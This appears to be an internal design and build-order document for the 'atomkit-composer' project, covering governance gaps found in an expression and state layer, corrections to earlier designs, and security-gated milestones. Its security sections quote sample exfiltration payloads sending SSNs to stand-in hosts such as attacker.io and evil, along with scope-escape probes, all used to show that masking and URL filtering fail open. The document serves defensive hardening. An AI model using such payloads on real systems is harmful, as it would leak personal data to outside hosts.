# atomkit-composer — BUILD ORDER

Author: composer-tech-lead. Status: authoritative. This document supersedes the individual designs where
they conflict. Every ruling below was re-verified by execution against the live builds
(`/Users/noidme/atomkit` core 0.7.0, `/Users/noidme/atomkit-compiler` 0.4.0, `/Users/noidme/atomkit-app`)
on 2026-07-10. Where a claim is not backed by a command I ran, it is marked **unverified**.

I own the seams and the build. My job here is to say which of five good designs is right, where each is wrong,
and in what order we build so the biggest risk dies first and the app actually ships. The team designed well.
The red-team did its job — it caught real bugs that were about to become code. Below I rule on all of it.

---

## 1. Verdict on the mandate

**The mandate — "atomkit-composer must be a pure-AQL project" — is ACHIEVABLE as an end state, but it is NOT the
critical path, and it cannot be built on the sequencing the Language Charter proposes. I accept the mandate as the
north star and reject the charter's ordering. I also give the owner a real option to reject the mandate outright,
because the one thing we can actually sell does not need it.**

Three verified facts decide this.

**(a) The wedge is orthogonal to the language.** Governance runs at egress, on presentational content, before any
interactivity exists:

```
$ grep -n "stripDocument\|renderToStaticMarkup" atomkit-app/src/render.ts
27:  const program = parse(src);
31:  const safe = stripDocument(document, ctx);      # governance egress
32:  const { doc: resolved, notes } = await resolveData(safe, cfg, opts);
33:  const html = renderToStaticMarkup(               # render AFTER strip
```

The composer's canvas is already real AQL: `Render(stripDocument(doc, persona))`. The 19 shipped atoms are all
presentational and that is *enough* to ship the differentiator. **Nothing about the governance wedge requires
`state`, `on:`, `if=`, `for=`, or a reactive runtime.** So the sellable asset is not hostage to the language.

**(b) The interactive layer, as designed, BREAKS the wedge.** This is the finding that reorders everything. I put
the pre-strip user document in an expression scope — exactly what the interaction design does when it feeds
`render-document document={{state.doc}}` — and read a masked value straight around the mask:

```
$ node -e 'stripDocument(pii-doc, {canViewPii:false}) → props.text = "•••••"
           evalExpr("state.doc.root[0].props.text", {state:{doc}}) → "SSN 123-45-6789"
           interpolate("{{state.doc.root[0].props.text}}", {state:{doc}}) → "SSN 123-45-6789"'
```

The composer's own binding contract (`docs/DECISIONS.md:118-129`) already forbids this in writing: *"Any design
that evaluates expressions against the unstripped document breaks governance. The renderer must never hold a
reference to the pre-strip document,"* and *"a `state` field will need stripping too … must be closed before state
ships."* The Language Charter's §6 "governance proof" claims this is closed by construction. **It is not.** The
proof rests on a parse-time root allowlist that does not exist in the shipped interpreter (verified below), on a
`maskNode` backstop that is unimplemented (verified: `state.ssn` survives masking), and on `safeHref` blocking
exfiltration (verified: it passes `https://attacker.io/?ssn=…` unchanged). Interactivity is therefore not a matter
of wiring five optional fields — it is a governance re-architecture that must land *before* the first `state` block
touches the renderer.

**(c) The pure-AQL constraint is an owner conviction, not a buyer signal.** No competitor is built out of its own
output format (Gutenberg's editor is React, Figma is not made of Figma, Plasmic/Webflow builders are React apps).
The composer's own README concedes its chrome "cannot be written in AQL" today. This is legitimate to *want* — it
is a real dogfooding proof that AQL is expressive — but it is not something a market pays for, and calling it "the
critical path" is how a team spends four quarters building a runtime nobody asked for. The business strategist is
right on this structural point (it needs no market data), and I weight it. I do **not** weight the strategist's
market-sizing claims (Plasmic positioning, competitor pricing, HIPAA-CMS): those are WebSearch snapshots I cannot
reproduce here (**unverified**), and two of that design's *own* "verified" claims are false by my execution — the
21-document conformance suite exists and passes, and the composer repo is not "zero source" (it has a 328-line
spike). I do not let an argument built partly on stale evidence override a decision; I let the verified half stand.

**The ruling, as the person who says no to scope that has not earned its place:**

- **North star:** pure-AQL composer. Kept. It is a coherent end state and the invariant *atoms-are-code /
  everything-above-is-data* is sound.
- **Critical path:** NOT the language. The critical path is **(1) prove governance survives state, then (2) ship
  the wedge.** The language is built *after* the governance gate, incrementally, each step conformance-tested.
- **The owner's real choice, stated plainly:**
  - **Option A — Full pure-AQL (accept mandate literally).** Fund the multi-quarter governed-interactivity build.
    Gated on M0 (below) going green. Cost: the composer produces its first sellable page only after the language,
    action layer, interactive atom pack, editor atom pack, and compiler interactive mode all land.
  - **Option B — Ship the wedge now, treat pure-AQL as R&D (reject mandate as critical path).** Composer chrome on
    a transitional React host; canvas in real AQL; the wedge ships on 19 presentational atoms. Pure-AQL chrome
    becomes the *last* milestone, pursued only if M0 is green and a design partner wants interactivity.
  - **My recommendation: the hybrid.** Fund **M0 regardless** — it is a hard prerequisite for *any* interactivity
    and it is the single highest-leverage risk to retire. Then default to **Option B's sequencing** (wedge first,
    on a transitional chrome) and let the language grow behind the governance gate toward the Option A end state.
    This ships the differentiator in one milestone and keeps the mandate reachable without betting the roadmap on
    it.

Cost of the mandate, honestly: **the pure-AQL chrome is the last thing we build, not the first.** Anyone who
expects a pure-AQL composer to be the near-term deliverable will be surprised, so it is stated here in plain words.

---

## 2. Corrections — every false claim the red-team caught (each re-verified by me)

These were going to be bugs. Corrected fact + evidence I ran.

| # | Claim (in a design) | Corrected fact | Evidence I ran |
|---|---|---|---|
| C1 | `expr.ts` is a NEW module to be created (Charter §2, coreChanges, filesIOwn). | **`expr.ts` already exists**, committed and exported. Only `action.ts` is genuinely new. | `git log`: `91ef9bd feat: safe expression evaluator`. `ls src/expr.ts` → 14735 bytes. `index.ts: export * from './expr.js'`. `ls src/action.ts` → No such file. |
| C2 | Expression `ref` root MUST be `state`/`event`/loop-var else a **parse error** — the basis of the governance proof (Charter §2.3/§6). | **No root restriction exists.** The grammar accepts any bare identifier as a ref root; safety depends entirely on what the caller puts in scope. | `parseExpr("document.cookie")` → `{k:member,obj:{k:ref,name:document},prop:cookie}` (accepted). `evalExpr("secret",{secret:42})` → `42`. |
| C3 | AST is `{k:'ref', root, path:Member[]}` + a `{k:'tpl'}` node (Charter §2.2/§2.8). | Shipped AST is `{k:'ref',name}` + separate `{k:'member',obj,prop}`; **no `root` field, no `tpl` node** (templates handled by regex `interpolate`). | `parseExpr("state.count > 3")` → `{k:bin,op:>,l:{k:member,obj:{k:ref,name:state},prop:count},r:{k:lit,v:3}}`. |
| C4 | Expression caps are 512 / 64 / 32 / 16 / 8 (Charter §2.5). | Shipped caps: **`MAX_SOURCE=1000, MAX_NODES=200, MAX_DEPTH=32`**. No separate ref-chain or arg cap. 3 of 5 numbers wrong. | `import ./dist/expr.js` → `MAX_SOURCE 1000 MAX_NODES 200 MAX_DEPTH 32`. |
| C5 | Whitelist `FNS = len,lower,upper,trim,contains,startsWith,endsWith,default,num,str,round,floor,ceil,abs,min,max` (Charter §2.4). | Actual `FUNCTIONS = len,upper,lower,trim,includes,startsWith,endsWith,not,min,max,abs,round,floor,ceil,join,first,last,fallback`. `contains/default/num/str` do **not** exist; `includes/not/join/first/last/fallback` do. | `Object.keys(FUNCTIONS)` printed above. |
| C6 | `navigate` is safe because it "routes through `safeHref` … there is no arbitrary-fetch verb" (Charter §6.4, Compiler, Interaction, UX). | `safeHref` filters **schemes, not destinations.** Any `https://` URL passes verbatim → exfiltration is not blocked. | `safeHref("https://attacker.io/collect?ssn=123-45-6789")` → returned unchanged. `safeHref("javascript:…")` → `#`. `url.ts:10`. |
| C7 | `maskNode` will drop `on/when/each/bindings/state` on a masked node — the §6.6 "egress backstop". | **Unimplemented and fails OPEN.** `maskNode` spreads `{...node, props}`; all five new fields survive, and `state.ssn` survives verbatim. | `maskNode(pii-node)` → `props:{text:"•••••"}` but `on,when,each,bindings,state` all `true`; `state:{ssn:"123-45-6789"}`. `security.ts:78`. |
| C8 | "The strict schema rejects unknown keys everywhere" is a complete trust boundary. | True for **top-level node keys**, but `props` is an open `z.record`, so `props.state` / `props["on:click"]` are **smuggled past** the boundary. | `parseDocument({root:[{…,state:{}}]})` → REJECTED; `parseDocument({root:[{…,props:{state:{ssn},"on:click":"x"}}]})` → ACCEPTED. `schema.ts:195`. |
| C9 | "An expression cannot read a PII-masked value; it can produce nothing a static author could not" (Interaction/UX securityAnalysis). | **False.** Expressions read raw PII out of the pre-strip document held in state; `stripDocument` only masks the rendered copy. | `evalExpr("state.doc.root[0].props.text",{state:{doc}})` → `"SSN 123-45-6789"` while `stripDocument(doc).root[0].props.text` → `"•••••"`. Contradicts `DECISIONS.md:118-129`. |
| C10 | The five new fields are "additive and non-breaking; serialize round-trips." | `serialize()` **silently drops** unknown node fields — the exact governance-downgrade class the THROW-on-unrepresentable contract exists to prevent. | `serialize({root:[{type:button,props:{text:Add},on:{click:inc},state:{x:1}}],meta:{title:T}})` → `page "T" {\n  button "Add"\n}` — `on` and `state` gone. |
| C11 | Compiling the one-line doc emits three nodes: a button and two `<p>` texts (Compiler verifiedFinding #1). | The **inline single-line parser merges** the button + both texts + `if` into ONE button node. The 3-node output only appears with newline separation. | `compilePage('page{ … button "Inc" … text "{{…}}" text "hidden?" if=… }')` → `[{type:state},{type:button,props:{text:"",on:click,"{{state.count}}":"","hidden?":"",if:"…"}}]`. |
| C12 | Composer AQL like `document={{state.doc}}` "parses against the real grammar" (Interaction, UX fragments). | **Unquoted `{{` splinters the line** — `{` opens a block. `{{ }}` survives **only inside quotes**. Every unquoted example is unparseable as written. | `compilePage('render-document document={{state.doc}} selected={{…}}')` → roots `["render-document","selected="]`. `compilePage('box w="{{state.width}}"')` → `style.width="{{state.width}}"` (survives). |
| C13 | "I could not confirm 21 docs in the conformance suite … the count is a claim" (Strategy). | The suite is **exactly 21 documents and passes green.** Reached "unverified" via a line-count instead of reading the CORPUS. | `grep -c "^  \['" test/conformance.test.mjs` → `21`; `node --test` → `✓ conformance: 21 documents render identically … pass 1 fail 0`. |
| C14 | "The composer repo is empty … zero source." (Strategy). | Repo has a **328-line spike** (`spike/instrument-proof.mjs` 168, `spike/render-document-canvas.mjs` 160). The "app is unbuilt" thesis holds; the inventory is stale. | `find … -type f` lists both; `wc -l` → 168 + 160. |
| C15 | A hand-edited `library/*.aql` can carry **duplicate node ids** (Molecule risk #2). | **AQL has no node-id syntax.** An authored `id=x` lands in `props.id`; `compileNode` always assigns unique tree-path ids. The real duplicate-id vector is programmatic subtree cloning, which is correctly guarded by re-mint. | `compilePage('box id=dup { text "a" id=dup … })` → node ids `["0","0-0","0-1"]` (unique), `props.id="dup"`. |

Load-bearing corrections, restated so nobody misses them:

- **The governance proof is currently vacuous** (C2 + C7 + C9). The "disjoint readable namespace" is enforced by
  nowhere; the interpreter reads any key in whatever scope it is handed.
- **`serialize` drops the new fields silently** (C10) — a governance-downgrade regression, not a nicety.
- **The interpolation grammar collides with block syntax** (C12) — every design's unquoted `{{ }}` is wrong.

---

## 3. Security rulings

The whole product is fail-closed governance. A state/expression/action layer that can read a masked value kills
it. I rule on each hole explicitly. **Verdict shorthand: OPEN = the hole is real and unclosed today;
CLOSED-BY-DESIGN = a named change closes it; STANDING = already closed, keep it.**

**S1 — Expression reads a masked value from state. OPEN. Highest severity. Blocks all interactivity.**
Verified (C9): an expression over the pre-strip document returns the raw PII the renderer masks. Ruling — the
design does **not** close this; three things must be true before any `state` reaches the renderer:
1. **Strip-before-scope (ordering).** The interactive runtime evaluates expressions over the **stripped** document
   only. The renderer must never hold a reference to the pre-strip document (`DECISIONS.md:118-129`). For the
   composer chrome specifically: `render-document` must call `stripDocument` at its **own ingress** for a preview
   persona, and the chrome's expression scope must never bind the unstripped canvas doc.
2. **State is literal-only and governed at egress.** `state` initial values may not reference `data` or another
   node (so server PII cannot seed them), and `stripDocument`/`maskNode` must **mask or drop** `state` on any
   governed node.
3. **Deny-by-default mask (S3).** See below.

**S2 — Exfiltration via `navigate`/`call`. OPEN.**
Verified (C6): `safeHref` passes `https://attacker.io/?d=<state>` unchanged. Ruling — `safeHref` is an XSS/scheme
control, **not an exfiltration control**, and the securityAnalysis that cited it as blocking exfil is wrong. Every
`navigate`/`call` target must route through **`atomkit-http`'s existing SSRF/host allow-list** (as
`DECISIONS.md:132-134` already requires), not just `safeHref`. Until that routing exists, `navigate` with a
non-literal target is forbidden. `call(name)` is nullary and host-registered in v1.0.

**S3 — `maskNode` fails open on new node-level fields. OPEN.**
Verified (C7): `on/when/each/bindings/state` all survive masking. Ruling — `maskNode` must be **deny-by-default at
the node level**: rebuild the masked node from an explicit allow-list of carried fields instead of `{...node}`, so
`state/on/when/each/bindings` — and every future field — are dropped on a masked node by default. This is the §6.6
backstop, and it must land in the same change that adds the fields, not after.

**S4 — `props` smuggling. OPEN (partial).**
Verified (C8): `props.state` / `props["on:click"]` pass the strict schema. Ruling — the five interactive concepts
are **first-class strict fields, never props**. Add a schema refinement that **rejects reserved keys** (`state`,
`on:*`, `when`, `each`, `bindings`) inside `props`, and forbid the runtime/compiler from ever reading an interactive
concept out of `props`. (`maskNode` already drops object-valued props, which mitigates but does not close it.)

**S5 — The governance proof's root allowlist does not exist. OPEN.**
Verified (C2). Ruling — add a **reference-root allowlist enforced inside `expr.ts`** (reject any ref root not in
`{state, event, <loopvars>}` at parse or eval), so the "disjoint namespace" guarantee has an enforcement point in
the interpreter rather than in every caller's scope-construction hygiene. This is what makes the proof real.

**S6 — `serialize` drops the new fields → governance downgrade on round-trip. OPEN.**
Verified (C10). Ruling — extend `serialize()` **and** `assertRepresentable` to all five fields, preserving the
exact round-trip and the THROW-on-unrepresentable contract, before any authoring path can emit them.

**S7 — Compiler drift: a known atom bearing `when` compiles unconditional. OPEN once fields land.**
Verified: `RUNTIME_ONLY = {'video'}` (`codegen.ts:23`); `emitNode` does not inspect `when/each/on/bindings`. Ruling
— add a codegen guard treating **any node bearing an interactive field as `RUNTIME_ONLY`** (omit + warn) until
interactive codegen ships, so the 21-doc conformance suite stays green by construction.

**S8 — Runtime state-size DoS. OPEN.**
The Charter claims iteration is "bounded by the 100k source cap." False for the interactive path: `append`/`set`
grow state at runtime beyond any source cap. Ruling — add a **runtime cap on state size and per-render iteration
count**; do not rely on the source cap.

**S9 — Prototype pollution. STANDING (closed).**
`expr.ts` rejects `__proto__/prototype/constructor` and reads own-properties only; scope-escape probes
(`constructor.constructor`, `globalThis`, `process.env`) all return `undefined`. Keep the guard; the new
action write-path must reuse it.

**S10 — Arbitrary code execution / injection in compiled output. CLOSED-BY-DESIGN, conditional.**
The compiler's "interpret, don't transpile" rule (emit author bytes only as `j()` JSON literals passed to the
bundled `evaluate`/reducer) is sound. Ruling — accept it, **but** the "0 executions" proof is unreproducible (no
committed prototype, no `action.ts`, no `reduce` export — verified). It must be re-run against real, committed code
before it is cited as evidence, and the hostile-injection cases promoted into the conformance suite.

Net security posture: the wedge is **genuinely fail-closed for the 19 presentational atoms** (S9 standing; strip
runs at egress) and **fail-open for the interactivity the pivot introduces** (S1–S8). That asymmetry is the entire
reason M0 exists and comes first.

---

## 4. AQL 1.0 spec, final (reconciled with the shipped code)

This is the normative spec. It adopts the **actual** shipped `expr.ts` (not the Charter's invented shape) and folds
in the security rulings. Full detail in `docs/specs/aql-1.0-language.md`.

**Reserved surface (the entire delta):** head keyword `state`; attributes `if=` → node field `when`, `for=` → node
field `each`, `on:<event>=` → node field `on`; value syntax `{{ expr }}` **only inside a quoted value**; bindings
routed to node field `bindings`. Scope roots — the only readable names — are `state`, `event`, and enclosing loop
vars, **enforced in `expr.ts` (S5)**.

**State.** `state { k = <literal> }` on a page (→ `BuilderDocument.state`) or a container/widget (→
`BuilderNode.state`). Values are `Literal` (string/number/bool/null/array/object), **literal-only** — may not
reference `data`, props, or another node (S1). Own mini-parser (like `page`/`widget`), because the generic
tokenizer splits on spaces and cannot carry a JSON array.

**Expressions.** Use the **existing** module: `parseExpr` / `evalExpr` / `evaluate` / `interpolate`. AST is
`{k:'ref',name}` + `{k:'member',obj,prop}` + `{k:'index'}` + `{k:'unary'}` + `{k:'bin'}` + `{k:'cond'}` +
`{k:'call'}` + `{k:'lit'}`. Caps: **`MAX_SOURCE=1000, MAX_NODES=200, MAX_DEPTH=32`**. Whitelist:
`len,upper,lower,trim,includes,startsWith,endsWith,not,min,max,abs,round,floor,ceil,join,first,last,fallback`.
**New in 1.0:** a reference-root allowlist (S5). No `eval`, no `new Function` — confirmed absent. `{{ }}`
interpolation is regex-based and works **only inside quoted values** (C12); the linter must flag a bare `{{`.

**Actions (`action.ts` — NEW, does not exist yet).** Six whitelisted verbs:
`set / toggle / append / remove / navigate / call`. Stored as canonical strings that round-trip; validated at
ingest. Writes go only into a scope, reusing the `expr.ts` prototype guard (S9). `navigate`/`call` route through
`atomkit-http`'s host allow-list (S2). Multiple statements per handler, capped. A reducer both the runtime and the
compiler share (bundled, not reimplemented) so there is zero drift.

**Control flow.** `when` (from `if=`) and `each` (from `for=`) are **typed node fields**, not wrapper atoms —
because a wrapper atom would fail closed to `null` (`render.tsx:48`) and would force operands into untyped `props`.
Node fields are strict, validated, round-trippable, and mint no extra id (which matters — `parseDocument` rejects
duplicate ids). `each.in` may reference **only `state`/loop vars** in v1.0 (governed iteration over fetched arrays
is deferred — S1).

**Interactive atom contract.** `AtomRenderProps.emit?(event, payload)` (undefined under static `Render`, so the 19
presentational atoms are untouched); `AtomDef.emits?: string[]` and `AtomDef.valueProp?: string`. Standardized
payload vocabulary (`event.value`, `event.checked`, `event.id`, `event.zone`, …). Does not exist today — verified
`registry.ts` has no `emit/emits/valueProp`.

**Governance invariants (binding).** Strip-before-scope (S1); literal-only state (S1); deny-by-default node mask
(S3); root allowlist (S5); `serialize`/`assertRepresentable` cover all five fields (S6); actions via egress
allow-list (S2). **These are preconditions of the language, not add-ons.**

**Backwards compatibility.** All five fields optional and additive; a document that omits them parses/serializes/
renders identically, so the 21-doc suite stays green by construction. The one real behavior change: `if`/`for`/`on:`
become reserved attributes and `{{ }}` becomes interpolation inside quotes. Verified: no atom and none of the 21
corpus docs use them. Escape hatch: `\{{` for literal braces.

---

## 5. Core changes, ordered

Package · change · breaking? · lands in. (M-numbers are the milestones in §7.)

| # | Package / file | Change | Breaking? | Lands |
|---|---|---|---|---|
| K1 | atomkit `security.ts` | `maskNode` deny-by-default at node level (drop `state/on/when/each/bindings` on masked nodes via an explicit carry allow-list); `stripDocument` mask/forbid governed `state`. | no | **M0** |
| K2 | atomkit `expr.ts` | Add reference-root allowlist (`state`/`event`/loop-var); reject other roots at parse/eval. Add runtime state-size / iteration caps (S8). | no (additive guard) | **M0** |
| K3 | atomkit-http + atomkit `action.ts` contract | Route `navigate`/`call` targets through the SSRF/host allow-list; define the routing seam. | no | **M0** |
| K4 | atomkit `schema.ts` | Add five OPTIONAL strict fields (`BuilderDocument.state`, `BuilderNode.state/on/when/each/bindings`) + `Literal` type + ingest `.refine` validators; reject reserved keys inside `props` (S4). | no (additive) | **M2** |
| K5 | atomkit `query.ts` | `state{}` mini-parser; recognize `if=`/`for=`/`on:`; route quoted `{{ }}` values to `bindings`; **presence-guarded serialize branches for all five fields**; extend `assertRepresentable` (S6). | **yes** (reserves `if`/`for`/`on:`/`{{}}`) | **M2** |
| K6 | atomkit `render.tsx` + NEW `runtime.tsx` | Client `AtomkitRuntime` (`useReducer`) that evaluates `when/each/bindings` **over the stripped doc** (S1) and dispatches `on` via the shared reducer. Static `Render` unchanged. | no | **M2 (state) / M3 (actions)** |
| K7 | atomkit-compiler `codegen.ts` | Guard: any node bearing an interactive field → `RUNTIME_ONLY` (omit+warn) until interactive codegen lands (S7). | no | **M2** |
| K8 | atomkit `registry.ts` | `AtomDef.emits/valueProp`, `AtomRenderProps.emit` (no-op under static Render). | no (additive) | **M3** |
| K9 | atomkit `action.ts` (NEW) | Six-verb DSL + shared reducer + guarded write-path (reuse S9 guard). | no | **M3** |
| K10 | atomkit `atoms.tsx` | Interactive form pack (`input/select/textarea/checkbox/radio/switch`, `button`-with-`on:click`). | no (additive) | **M3** |
| K11 | atomkit `atoms.tsx` + `instrument.ts` | Editor atom pack (`render-document` canvas, `drag-source`, `drop-target`/`sortable`, `tree`, `split-pane`, `overlay`, `resize-handle`, `context-menu`, `modal`, `toolbar`). `render-document` calls `stripDocument` at its own ingress (S1). | no (additive) | **M4** |
| K12 | atomkit `query.ts` | `serializeWidget` / `serializeProgram` (emit `widget` blocks); validate widget bodies in `parse()` (close the `query.ts:320` pages-only gap). | no (additive) | **M4** |
| K13 | atomkit-compiler `codegen.ts` + NEW `runtime-prelude.ts` | Interactive mode: bundle core's `evaluate`+`reduce` into a React-free IIFE; emit `useReducer`+handlers as **data** (interpret-don't-transpile); build-time guard that a missing prelude export fails compile. | no | **M5** |
| K14 | atomkit `style.ts` + `schema.ts` + `query.ts` | Four editor style props: `cursor` (enumerated keyword whitelist, reject `url()`), `whiteSpace`/`textOverflow`/`wordBreak`, `flexGrow/Shrink/Basis`+`alignSelf`, `gridTemplateRows`. Plus bindable, boolean/token-coerced ARIA state (`aria-selected/pressed/expanded/current`) for keyboard/AT parity. | no (additive) | **M5** |

Notes on ownership seams (I own these boundaries): `expr.ts`/`query.ts`/`schema.ts`/`action.ts` are language-owned
(aql-language-designer + aql-runtime-engineer); `security.ts` is governance-owned (aql-security-engineer);
`codegen.ts` is compiler-owned; `atoms.tsx`/`registry.ts` split between the atoms and interaction agents. K5 is the
only **breaking** change and it is safe today (verified no corpus/atom uses the reserved tokens).

---

## 6. The atomic ladder

*Atoms are code; everything above is data.* Each rung, and what "save back to the library" means.

| Rung | What it is | Minted by | Stored as | "Save back to the library" |
|---|---|---|---|---|
| **atom** | A React component (`AtomRenderProps → ReactNode`). 19 today, all presentational. | **Code only** — a developer + codegen. A designer **cannot** mint one. | `@noidmejs/atomkit` source. | **Not from the composer.** Requires a code change + codegen. This is the hard boundary. |
| **variant** | A named preset of ONE atom's props/style (`Button/Primary`). No structure. | Designer. | A **single-atom `widget`** in `library/variants/*.aql`. | Serialize the styled node to a `widget` block + manifest entry. Can be *inserted* as a new node OR *applied* (merge props/style onto a selected node of the same type). |
| **molecule** | A named multi-atom subtree — the **dead `widget` primitive**, revived. | Designer. | A `widget` block in `library/molecules/*.aql`. | Serialize the subtree to a `widget` (needs K12). Instantiate = clone → **re-mint every id** (verified required: naive double-instantiation throws `duplicate node id`) → substitute `{{param}}` literals → splice. Validated by `parseDocument` at save (closes the widget gap). |
| **organism** | A bigger molecule (nav bar, footer) — a deeper `widget`. | Designer. | Same `library/` + `kind:"organism"`. | Identical mechanism, larger grain. Not a second system. |
| **template** | A `widget` whose body is a whole page's root set. | Designer. | Same `library/` + `kind:"template"`. | Identical mechanism. |
| **project** | The composed application. | Composer. | `.aql` files + `atomkit.config.json` + `library/` + `manifest.json`. | The Download/eject unit. Governed nodes fail-closed omitted by the compiler (verified). |

The molecule is the linchpin: `widget` is verified dead (`parse` emits it into `program.widgets`; **nothing
consumes it** in any repo) and it is the only rung a designer can create without writing code. The library is
**pure data** (`.aql` bodies + JSON manifest), identity is `sha256(canonical serialize(body))`, and a molecule
degrades fail-closed on a core upgrade because it is atom-types-as-data (unknown atoms render `null`).

**Correction carried from the red-team (C15):** "save back to the library" must validate the **programmatically
extracted subtree** with `parseDocument` — that is the real duplicate-id / malformed-node vector. Hand-edited
`.aql` cannot carry duplicate node ids (no id syntax). The save gate needs a **negative-control test** (a subtree
that should be rejected *is* rejected), or the guard ships green and useless.

---

## 7. Milestones — the biggest risk dies first

Each milestone: owner agent · demoable outcome · the test that proves it. **M0 retires the biggest risk
(governance dies when state touches the renderer), not the easiest.** No milestone is "done" until it demos.

### M0 — Governance survives state (THE GATE)
- **Owner:** aql-security-engineer (+ aql-language-designer for K2, atomkit-http owner for K3).
- **Scope:** K1 (deny-by-default `maskNode`), K2 (root allowlist + runtime caps), K3 (action egress via SSRF
  allow-list), and the **strip-before-scope** invariant for the runtime.
- **Demo:** a hostile-document corpus runs the full egress path and every attack fails —
  (a) PII in `state` read from a non-PII node → masked;
  (b) `{{state.doc…pii…}}` over a persona preview → `•••••`;
  (c) `navigate('https://evil/?d='+state.ssn)` → blocked by the host allow-list;
  (d) `props.state`/`props.on:click` smuggle → rejected.
- **Test:** a NEW `security-conformance` suite, red-team-authored, that is **RED today** (I verified every hole
  above) and must go GREEN. This is the gate: **no `state`/`on`/`when`/`each`/`bindings` is wired into the renderer
  until this suite is green.** If it cannot be made green, the mandate is deferred and we ship M1 only.
- **Why first:** it is the one risk that, unretired, silently converts the product's differentiator into its
  worst liability. Everything interactive depends on it.

### M1 — The wedge, shippable (presentational, no language needed)
- **Owner:** composer-tech-lead (me) + composer-ux-designer.
- **Scope:** the composer produces ONE governed page end-to-end on the 19 presentational atoms + the AQL canvas
  (`Render(stripDocument(doc, persona))`); the persona switcher (the hero) on the **real** egress path; chrome on a
  **transitional React host** (the pure-AQL chrome is M5 — we do not block the wedge on the language); Download/eject
  via the compiler.
- **Demo:** flag a text node PII → switch persona to Anonymous → it masks live; Download the React; the anonymous
  eject contains no PII.
- **Test:** an assertion that the preview is byte-identical to `atomkit-app`'s production `stripDocument` path
  (`render.ts:31`), and that the compiled/ejected output for the anonymous persona contains no masked value.
- **Ships the sellable thing in one milestone, independent of M2–M5.**

### M2 — State + expressions, wired and conformant (only after M0 is GREEN)
- **Owner:** aql-language-designer + aql-runtime-engineer.
- **Scope:** K4 (five strict fields + reserved-key rejection in props), K5 (parser + serialize + assertRepresentable
  — S6), K6 state half (runtime evaluates `when/each/bindings` over the **stripped** doc), K7 (compiler
  RUNTIME_ONLY guard). Reconcile with the **existing** `expr.ts` (adopt its grammar/AST/caps/FUNCTIONS; no rewrite
  of the committed exported API).
- **Demo:** a live counter and a conditional/`for` list, in AQL, rendered — with the M0 security corpus still green.
- **Test:** the 21-doc conformance suite stays green + a round-trip test for all five fields (parse→serialize→parse
  value-stable, and THROW on unrepresentable) + the M0 security corpus re-run with state live.

### M3 — Actions + the governed-form slice
- **Owner:** aql-runtime-engineer + aql-security-engineer + interactive-atoms owner.
- **Scope:** K9 (`action.ts` + shared reducer), K3 wired (navigate/call via allow-list), K8 (`emit` contract), K10
  (interactive form pack), K6 action half. The smallest real interactive product: a **governed form** (`on:submit`
  → one host-registered effect; consent/role gates the submit; PII never echoed back).
- **Demo:** a governed form that submits through the host effect and cannot reach an arbitrary URL.
- **Test:** an exfiltration test (state cannot reach an off-allowlist host) + interactive event-parity conformance
  (fire an event on the runtime store and on the compiled `useReducer`; diff post-dispatch DOM).

### M4 — Editor atom pack + molecules
- **Owner:** composer-interaction-engineer + composer-molecule-architect.
- **Scope:** K11 (`render-document` + DnD/selection/tree/chrome atoms, `instrument.ts`-based; strip at ingest), K12
  (`serializeWidget`/`serializeProgram` + widget-body validation). Molecules/variants/organisms/templates on the
  `widget` primitive; canonical-serialize identity + dedupe.
- **Demo:** drag an atom onto the canvas, reorder via keyboard AND pointer, save a subtree as a molecule,
  re-instantiate it twice (ids re-minted, no collision).
- **Test:** molecule round-trip via canonical `serialize()` strings (not `JSON.stringify` — round-trip is value-
  stable, not key-order-stable, verified `pii`↔`protected` reorder) + a **negative-control** save-as-molecule test
  (a bad subtree is rejected).

### M5 — Compiler interactive mode + pure-AQL chrome (the mandate, fully met)
- **Owner:** aql-compiler-engineer + composer-ux-designer + composer-a11y-guardian.
- **Scope:** K13 (interactive codegen: bundle `evaluate`+`reduce`, emit hooks/handlers as **data**; build-time
  guard on missing prelude export), K14 (four editor style props + bindable ARIA). Migrate the chrome off the
  transitional React host to **pure AQL**.
- **Demo:** the composer's own chrome is an `.aql` document, compiled to standalone React, behaving identically to
  the runtime.
- **Test:** the chrome runs through the interactive conformance suite (runtime SSR == compiled) + a hostile-
  injection block (author payloads appear only inside JSON literals; compile+render has no side effect) + an
  **assistive-tech** test on the persona tablist / layers tree (bound `aria-selected/expanded` announced — a WCAG
  4.1.2 gate the a11y-guardian owns and can veto on).

**Sequencing truth:** the mandate ("the compiler transforms") is fully satisfied only at **M5**. M1 ships the
business. M0 is the non-negotiable gate. Nothing between M2 and M5 is allowed to regress the M0 security corpus or
the 21-doc conformance suite.

---

## 8. What this does NOT do (stated plainly, so no one is surprised)

- **It does not let a designer mint an atom.** Atoms are code; new atoms need a code change + codegen. The composer
  creates molecules/variants/organisms/templates, never atoms.
- **It does not ship any interactivity until M0 is green.** If the governance-survival suite cannot be made green,
  `state`/actions do not ship, and the product is the wedge on presentational atoms (M1) — full stop.
- **It does not statically compile interactive nodes until M5.** Between M2 and M5, interactive-field-bearing nodes
  are `RUNTIME_ONLY` (omit + warn). A pure-AQL interactive composer runs only on the runtime until then.
- **It does not support governed iteration over fetched (PII) arrays in v1.0.** `each.in` is `state`/loop-var only;
  masking a resolved `api=` array is a v1.1 item.
- **It does not round-trip node identity through AQL.** AQL has no id syntax; the editor mints and owns ids. An
  imported document is re-parsed with fresh tree-path ids.
- **It does not auto-propagate molecule edits to placed instances in v1.0.** Instances are inlined; "re-sync from
  molecule" is a manual, opt-in reconciliation via sidecar provenance. True single-source references are a v1.1
  item and are new attack surface (recursion caps + post-expansion strip) requiring their own review.
- **It does not make the wedge a compliance certification.** Per-node redaction helps pass a security review; it is
  not SOC 2 / a BAA / an audit log. Those are separate work and are the actual gate for a regulated buyer.
- **It does not support `position: sticky/fixed`.** Verified: `stripDocument`'s anti-clickjacking rule drops
  `position` for sticky/fixed, leaving orphan offsets. Panel headers use fixed-height rows + scrolling bodies.
- **The pure-AQL chrome is the LAST milestone, not the first.** Until M5, the composer's own UI is a transitional
  React host. Anyone expecting a pure-AQL composer as the near-term deliverable should reset that expectation now.
- **It does not treat the Language Charter's §6 "proof" as valid.** The proof is re-derived here on the *actual*
  code (root allowlist S5, deny-by-default mask S3, strip-before-scope S1, egress allow-list S2) — and only holds
  once those four land.

---

*Every "verified" statement in this document was produced by running the command shown against the live builds on
2026-07-10. Re-verify anything you depend on before you build on it — the world moved between the Charter's snapshot
and this one (`expr.ts` and `instrument.ts` landed mid-design), and it will move again.*
